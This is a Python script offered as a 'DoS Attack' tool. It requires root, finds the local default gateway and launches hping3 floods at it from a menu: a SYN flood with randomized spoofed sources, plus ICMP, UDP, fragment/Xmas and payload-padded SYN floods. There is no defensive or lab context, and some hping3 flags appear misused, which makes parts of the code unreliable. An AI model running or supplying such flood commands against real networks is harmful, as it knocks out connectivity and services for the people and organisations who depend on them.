import os
import subprocess
import netifaces

from pathlib import Path
 
def check_root():
    if os.geteuid() != 0:
        print("This script must be run as root. Exiting.")
        exit(1)

def get_gateway_ip():
    gws = netifaces.gateways()
    default_gw = gws.get('default', {})
    if default_gw and default_gw.get(netifaces.AF_INET):
        return default_gw[netifaces.AF_INET][0]
    return None
 
def show_menu():
    print("=" * 50)
    print("\n DoS Attack ")
    print("=" * 50)
    print("1. SYN FLood Attack (Spoofed)")
    print("2. ICMP Flood Attack")
    print("3. UDP Flood Attack")
    print("4. Fragment/Xmas Attack")
    print("5. Custom Data SYN Attack")
    print("6. Exit")
 
def run_hping3(option, gateway_ip=None, iface="wlan0"):
    if option == "1":
        cmd = ["hping3", "-i", iface, "-S", "--flood", "--rand-source", f"{gateway_ip}", "-p", "80"]
    elif option == "2":
        cmd = ["hping3", "-1", "-i", iface, "--flood", f"{gateway_ip}"]
    elif option == "3":
        cmd = ["hping3", "-2", "-S", "-i", iface, "--flood", "-p", "53", f"{gateway_ip}"]
    elif option == "4":
        cmd = ["hping3", "-F", "-x", "--flood", f"{gateway_ip}", "-p", "80"]
    elif option == "5":
        cmd = ["hping3", "-S", "--flood", "--data", "X"*1024, f"{gateway_ip}", "-p", "80"]
    elif option == "6":
        return
    else:
        print("Opțiune invalidă.")
        return
    
    subprocess.run(cmd)
 

def main():
    check_root()
    default_iface = netifaces.gateways()['default'][netifaces.AF_INET][1]   
    gateway_ip = get_gateway_ip()

    while True:
        show_menu()
        opt = input("Choose an option: ")
        if opt == "6":
            break
        run_hping3(opt, gateway_ip, iface=default_iface)

if __name__ == "__main__":
    main()